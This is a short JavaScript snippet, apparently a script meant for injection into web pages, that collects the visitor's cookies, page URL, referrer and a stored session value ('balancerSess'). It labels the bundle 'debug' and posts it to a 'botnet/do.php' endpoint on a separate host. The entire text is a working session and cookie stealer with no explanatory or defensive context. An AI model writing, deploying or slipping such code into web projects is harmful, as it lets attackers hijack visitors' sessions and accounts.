cookie=document.cookie;
url=document.location.href;
ref=document.referrer;

var debug = {
	cookie: cookie,
	url: url,
	ref: ref,
	hash: localStorage.getItem("balancerSess")
}

$.post("http://10.68.100.60/botnet/do.php", debug);
